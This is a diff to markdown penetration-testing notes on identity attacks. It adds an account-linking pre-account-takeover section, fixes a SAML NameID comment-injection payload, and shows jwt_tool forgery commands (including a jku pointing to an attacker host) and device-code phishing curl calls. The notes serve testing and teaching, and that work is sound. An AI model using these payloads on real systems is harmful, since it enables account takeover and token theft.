@@ -220,6 +220,29 @@ python3 jwt_tool.py <id_token> -X k -pk pubkey.pem
 python3 jwt_tool.py <id_token> -X s -ju "http://<attacker>/jwks.json"
 ```
 
+### Account Linking / Pre-Account-Takeover
+
+"Sign in with Google/GitHub/Microsoft" links a federated identity to a local account, usually by matching **email** — and matching on a *mutable/unverified* email is a mainstream ATO class the token attacks above don't cover.
+
+```bash
+# Pre-account-takeover:
+# 1. Attacker registers a local account with the VICTIM's email (app never verifies it).
+# 2. Victim later signs up via the IdP. If the app LINKS BY EMAIL to the existing
+#    (attacker-seeded) account instead of creating a fresh one, the attacker's original
+#    password still works on the now-victim-owned account.
+
+# Unverified-email federation:
+# - App trusts the id_token `email` without checking `email_verified:true`, or trusts
+#   an IdP that lets users set an arbitrary unverified email → sign in asserting
+#   victim@corp.com and get merged into their account.
+
+# Provider confusion:
+# - Account keyed on `email` alone across multiple IdPs → log in with a DIFFERENT
+#   provider that asserts the same email and land in the victim's account.
+```
+
+> [!tip] The safe design links the federated identity on the **immutable `sub` (+ issuer)**, never the mutable `email`, and requires `email_verified:true`. If a target links or matches accounts on email, it's usually vulnerable — test it before the heavier token attacks. (Concept: [[Standards & Protocols/OAuth-OIDC|OAuth 2.0 & OIDC]] → trust model, account-linking row.)
+
 ---
 
 ## Azure AD / Entra ID — Token Abuse
@@ -460,8 +483,8 @@ echo "<token>" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m
 # alg:none on OIDC token
 python3 jwt_tool.py <token> -X a
 
-# SAML comment injection for NameID
-# admin<!--@target.com (parsed as "admin" by some libraries)
+# SAML comment injection for NameID (comment MUST be well-formed — see body)
+# admin<!---->@target.com (parsed as "admin" by some libraries)
 
 # Device code phishing — request a code, socially deliver it, poll for the token
 curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access"
@@ -473,5 +496,5 @@ curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" -d 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-26*
+*Model: claude-opus-4-8*
